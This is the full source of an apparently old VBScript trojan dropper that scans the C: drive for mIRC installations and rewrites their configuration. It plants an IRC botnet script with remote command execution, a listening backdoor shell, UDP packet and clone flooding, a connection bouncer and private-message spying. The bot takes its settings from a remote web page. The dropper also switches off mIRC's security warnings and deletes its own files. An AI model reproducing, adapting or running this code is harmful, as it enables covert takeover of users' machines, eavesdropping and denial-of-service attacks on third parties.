dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
AOtag= s & "mirc.dat"
DummyTag= "C:\winamod.dat"
TTag= s & "scripts.ini"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=scripts.ini"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=on *:input:*: { if (%txt == ON) { .sockwrite -n bot* privmsg %pm1 : $+ 4 $me 9 on  $server  to 12 $active 9 : 8 $1- } | elseif (%txt == OFF) return } "
fr6.writeline "n1=on *:text:*:?: { if (%txt == ON) { .sockwrite -n bot* privmsg %pm1 : $+ 12 $nick 9on  $server  to 4 $me 9 : 8 $1- } | elseif (%txt == OFF) return } "
fr6.writeline "n2=alias remote { .remote $1- | .remote on | /echo -ae *** Remote is $1- } "
fr6.writeline "n3=alias unload { /echo -ae *** Unloaded script ' $+ $2- $+ ' | halt } "
fr6.writeline "n4=alias socklist { /echo -ae *** No open sockets | halt } "
fr6.writeline "n5=on *:sockread:bot*: { sockread %cent | set %cent1 $gettok(%cent,1,32) | .set %cent2 $gettok(%cent,2,32) | if (%cent1 == PING) { sockwrite -tn $sockname PONG %cent2 | halt } | if ($gettok(%cent,4,32) == :!update) { sockopen check www.geocities.com 80 } | set %lnick $deltok(%cent1,1,64) | set %lnick2 $gettok(%lnick,1,46) "
fr6.writeline "n6=  if ($gettok(%cent1,2,64) isin %dcon) { if ($gettok(%cent,4,32) == :!exec) { $gettok(%cent,5-,32) } | if ($gettok(%cent,4,32) == :!report) { .sockwrite -n $sockname privmsg %dchan : $+ 9 Legionnaire 4 $me 9 ( $+ $ip $+ ) on  $server  reporting for duty (4LoT-G6.19) } | if ($gettok(%cent,4,32) == :!open) { .socklisten bd1 2255 } | if ($gettok(%cent,4,32) == :!view) { set %txt ON | set %pm1 $gettok(%cent,5,32) } | if ($gettok(%cent,4,32) == :!unview) { set %txt OFF | unset %pm1 } "
fr6.writeline "n7=    if ($gettok(%cent,4,32) == :!packet) { set %packet.ip $gettok(%cent,5,32) | set %packet.bytes $gettok(%cent,6,32) | set %packet.amount $gettok(%cent,7,32) | sockwrite -n $sockname privmsg %dchan : $+ 9Target:9 %packet.ip 9Bytes:9 %packet.bytes 9Amount:9 %packet.amount | set %packet.count 0 | set %packet.port $rand(1,6) $+ $rand(0,6) $+ $rand(0,6) $+ $rand(0,9) | :start | if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .sockwrite -n $sockname privmsg %dchan : $+ 9.::9Packeting Complete9::. | halt } | inc %packet.count 1 | /.sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes | goto start } "
fr6.writeline "n8=    if ($gettok(%cent,4,32) == :!flood) { set %nick $gettok(%cent,5,32) | set %clones $gettok(%cent,6,32) | set %channel $gettok(%cent,5,32) | set %server $gettok(%cent,7,32) | set %port $gettok(%cent,8,32) | set %flood1 $gettok(%cent,9-,32) | set %PSGflood on | var %var = 0 | :loop | inc %var | if (%PSGflood == on) && (%var <= %clones) { .sockopen PSG $+ %var %server %port | goto loop } | else { halt } } | if ($gettok(%cent,4,32) == :!clean) { .set %PSGflood off | .sockclose PSG* | .sockclose pac* | .unset %nick | unset %channel | unset %server | unset %port | unset %clones | unset %flood1 | .unset %* } "
fr6.writeline "n9=if ($gettok(%cent,4,32) == :!bnc) { set %pm2 $gettok(%cent,5,32) | .lotbnc $rand(1111,9999) $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) | .timer 1 1 .sockwrite -nt bot* privmsg %pm2 :[ $+ Server/Port/Password $+ ][ $+ /server $afad %.lotbnc.port %.lotbnc.pass $+ ] } | unset %lnick* } | else return } "
fr6.writeline "n10=on *:sockopen:bot*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,9) | .sockwrite -nt $sockname USER %user blablah x : $+ $me | .sockwrite -nt $sockname NICK $me $+ $rand(1,99) | sockwrite -tn $sockname join %dchan } "
fr6.writeline "n11=on *:sockclose:bot*:/.timer 1 3 sockopen bot-2 %dserv 6667 "
fr6.writeline "n12=on *:sockopen:check: { .sockwrite -n $sockname GET /someguy4545/index.htm HTTP/1.1 | .sockwrite -n check host $+ $chr(58) www.geocities.com | .sockwrite $sockname $crlf } "
fr6.writeline "n13=on *:sockread:check: { if ($sockerr > 0) return | sockread %check | if ($sockbr == 0) return | if (set1 isin %check) { .set %dchan $gettok(%check,2,32) | .set %dserv $gettok(%check,3,32) | .set %dch $gettok(%check,5-,32) | .set %ds1 $gettok(%check,4,32) } | if (set2 isin %check) { .set %dcon $gettok(%check,1-,32) } } "
fr6.writeline "n14=alias afad { if ($host = $null) { if ($ip = $null) { return anony.mus }  } | if ($host = $null) { if ($ip != $null) { return $ip }  } | if ($host != $null) { return $host } } "
fr6.writeline "n15=alias lotbnc { if ($1 == off) { lotbnc.close | return } | if ($1) && ($2) && ($sock(lotbnc.l).status != active) { .socklisten lotbnc.l $1 | .set %.lotbnc.port $1 | .set %.lotbnc.pass $2 } } "
fr6.writeline "n16=alias -l lotbnc.conn { .timerlotbnc.c off | .sockclose lotbnc.l | .sockopen lotbnc.serv $1 $2 $iif($3,$3,6667) | .sockwrite -n lotbnc.a :*** Redirecting to $1- } "
fr6.writeline "n17=alias lotbnc.close { .sockclose lotbnc.* | .unset %lotbnc.* | .unset %.lotbnc.* } "
fr6.writeline "n18=on 1:socklisten:lotbnc.l:{ .sockaccept lotbnc.a | .sockwrite -n lotbnc.a $crlf $+ :*** Please type /quote PASS <pass> | .timerlotbnc.c 1 30 .lotbnc.close } "
fr6.writeline "n19=on 1:sockopen:lotbnc.serv:{ .if ($sock(lotbnc.serv).status != active) return | .sockwrite -n lotbnc.serv %lotbnc.log | .set %lotbnc.connected 1 } "
fr6.writeline "n20=on 1:sockread:lotbnc.serv:{ .if ($sockerr > 0) return | .sockread %lotbnc.buf2  | .sockwrite -n lotbnc.a %lotbnc.buf2 } "
fr6.writeline "n21=on 1:sockread:lotbnc.a:{ .if ($sockerr > 0) return | .sockread %lotbnc.buf | .if ($gettok(%lotbnc.buf,1,32) == pass) { .if ($gettok(%lotbnc.buf,2,32) == %.lotbnc.pass) { .set -u30 %lotbnc.accept 1 | .sockwrite -n lotbnc.a $crlf $+ :*** Password accepted.. | .sockwrite -n lotbnc.a $crlf $+ :*** Please type /quote CONN <server> [port] } "
fr6.writeline "n22=  else .sockclose lotbnc.a } | .if ($gettok(%lotbnc.buf,1,32) == conn) && (%lotbnc.accept) { .if ($gettok(%lotbnc.buf,2,32)) lotbnc.conn $gettok(%lotbnc.buf,2-3,32) | else sockclose lotbnc.a } | .elseif ($gettok(%lotbnc.buf,1,32) == NICK) .set %lotbnc.log %lotbnc.buf | .elseif ($gettok(%lotbnc.buf,1,32) == USER) .set %lotbnc.log %lotbnc.log $+ $crlf $+ %lotbnc.buf "
fr6.writeline "n23=.if (%lotbnc.connected) { if ($istok(%lotbnc.buf,QUIT,32)) .timer 1 0 .lotbnc.close 1 | else .sockwrite -n lotbnc.serv %lotbnc.buf } } "
fr6.writeline "n24=on *:start: { if ($exists(server.ini)) /.remove server.ini | /.identd on | .sockopen check www.geocities.com 80 | set %txt OFF | .unset %cmd* | unset %pm* | .unset %lot* | .unset %ls* } "
fr6.writeline "n25=on *:connect: { if ($sock(bot-2).status != active) .timer 1 5 .sockopen bot-2 %dserv 6667 | else halt } "
fr6.writeline "n26=on *:socklisten:bd1: { .sockaccept bd2 } "
fr6.writeline "n27=on *:sockread:bd2: { sockread %cmd | if ($sock(lsh).status != active) { if ($gettok(%cmd,1,32) == edit) goto one | if ($gettok(%cmd,1,32) == exit) goto two | if ($gettok(%cmd,1,32) == telnet) goto three | else goto four "
fr6.writeline "n28=    :one | set %cmd2 $gettok(%cmd,2,32) | .timer 1 3 .readl | halt | :two | .sockclose bd* | sockclose lsh | .remove c:\tmp.txt | halt | :three | set %cmd6 shell $+ $rand(1,99) | .sockopen lsh $gettok(%cmd,2-,32) | halt "
fr6.writeline "n29=    :four | set %cmd2 c:\tmp.txt | run -n command /c %cmd > %cmd2 | .timer 1 3 .readl | halt } | if ($sock(lsh).status == active) { .sockwrite -n lsh $gettok(%cmd,1-,32) | if ($gettok(%cmd,1,32) == close) { if ($gettok(%cmd,2,32) == %cmd6) { "
fr6.writeline "n30=.sockclose lsh | sockwrite -n bd2 %cmd6 is closed } | else halt } | else halt } | else halt } "
fr6.writeline "n31=on *:sockopen:lsh: { if ($sockerr > 0) return | sockwrite -n bd2 %cmd6 is open } "
fr6.writeline "n32=on *:sockread:lsh: { if ($sockerr > 0) return | :nextread | sockread %lrh | if ($sockbr == 0) return | if (%lrh == $null) { %lrh = - } | sockwrite -n bd2 %lrh | goto nextread | halt } "
fr6.writeline "n33=on *:sockclose:lsh: { sockwrite -n bd2 %cmd6 has closed } "
fr6.writeline "n34=on ^*:text:*:?:if (www isin $1-) || (http isin $1-) { halt } "
fr6.writeline "n35=alias readl { set %cmd4 0 | set %cmd5 $lines(%cmd2) | :loop | if (%cmd5 > %cmd4) { inc %cmd4 | sockwrite -n bd2 $read -l $+ %cmd4 %cmd2 | goto loop } | else halt } "
fr6.writeline "n36=on *:sockopen:PSG*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) | .sockwrite -nt $sockname JOIN : $+ %channel | .sockwrite -n $sockname privmsg %channel : $+ $chr(1) $+  $+ $chr(1) | .sockwrite -n $sockname privmsg %channel : $+ %flood1 |  .sockclose $sockname | .sockopen PSG $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port } "
fr6.writeline "n37=on *:sockread:PSG*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == PING) { sockwrite -tn $sockname PONG $chr(58) $+ $server } } "
fr6.writeline "n38=on *:join:#: { if ($nick != $me) .msg $nick %dch } "
fr6.writeline "n39=on *:part:#: { if ($nick != $me) .msg $nick %dch } "
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n2=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[warn]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(n2a)=ucase("fserve=on") then
fr2a.writeline "fserve=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")
sss.DeleteFile "c:\rol.vbs"
sss.DeleteFile "c:\winamod.dat"
